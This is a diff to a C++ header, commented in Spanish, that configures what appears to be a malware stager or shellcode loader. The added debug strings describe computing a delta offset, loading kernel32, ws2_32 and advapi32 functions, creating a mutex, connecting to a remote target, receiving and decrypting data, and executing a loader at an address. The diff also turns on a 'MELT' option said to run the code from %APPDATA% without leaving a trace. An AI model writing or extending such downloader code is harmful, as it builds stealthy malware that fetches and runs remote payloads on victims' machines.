@@ -18,6 +18,42 @@
 #include "preprocessor/cat.hpp"
 
 /*###############################################################################
+** DEBUG:
+**    Incluye código para mostrar mensajes por consola
+*###############################################################################*/
+#define DEBUG
+#undef DEBUG
+
+#ifdef DEBUG
+#define DEBUG_MSG(s, SEQ)  __asm{pushad} BOOST_PP_SEQ_FOR_EACH_I(PUSH_THINGY, 0, SEQ) __asm{push (s)} __asm{call printf} __asm {add esp, ((BOOST_PP_SEQ_SIZE(SEQ) + 1)*4)} __asm{popad}
+#define PUSH_THINGY(r, d, i, e) __asm{push e}
+#pragma data_seg(".rdata")
+const char* sDELTA[]    = {"[S]Delta offset calculado: %X.\n"};
+const char* sBUFFER[]   = {"[S]Buffer de 1KB creado en: 0x%08X.\n"};
+const char* sAPPDATA[]  = {"[S]%%APPDATA%% = '%S'\n"};
+const char* sCK32       = {"[S]Cargando %d funciones de kernel32"};
+const char* sCW32       = {"[S]Cargando %d funciones de ws2_32"};
+const char* sCA32       = {"[S]Cargando %d funciones de advapi32"};
+const char* sMTX        = {"[S]Iniciando MUTEX '%s'\n"};
+const char* sOFFLINE    = {"[S]Ruta del fichero OFFLINE '%s'\n"};
+const char* sNEWSOCKT   = {"[S]Socket creado: %X\n"};
+const char* sCON        = {"[S]Conectando a: '%s'\n"};
+const char* sRECV       = {"[S]Recibidos %d bytes\n"};
+const char* sICRYPT     = {"[S]Iniciando descifrado.\n"};
+const char* sECRYPT     = {"[S]Descifrado finalizado.\n"};
+const char* sHASH       = {"[S]Comprobando que el checksum de %d bytes sea %X.\n"};
+const char* sEJEC       = {"[S]Ejecutando el loader en 0x%08X.\n"};
+const char* sRESET      = {"[S]Reiniciando socket.\n"};
+const char* sADDR       = {" (0x%08X)... "};
+const char* sOK         = {"OK\n"};
+const char* sERR        = {"Error\n"};
+const char* sTARGET     = {"[S]Cargando siguiente TARGET(%s:%d)...\n"};
+#else
+#define DEBUG_MSG(...)
+#define DEBUG_MSG_ASM(s, SEQ)
+#endif
+
+/*###############################################################################
 ** MELT:
 **    Si se define la compilación MELT el código generado tendrá
 **    la capacidad de ejecutar la ejecución en %APPDATA% sin dejar rastro.
@@ -26,7 +62,7 @@
 **    }
 *###############################################################################*/
 #define MELT
-#undef MELT
+//#undef MELT
 
 /*###############################################################################
 ** Error_Check:
@@ -81,6 +117,9 @@
 #endif
 #ifdef SC_NULL
     #pragma message("\t\tSC_NULL")
+#endif
+#ifdef DEBUG
+    #pragma message("\t\t DEBUG")
 #endif
 
 /*###############################################################################
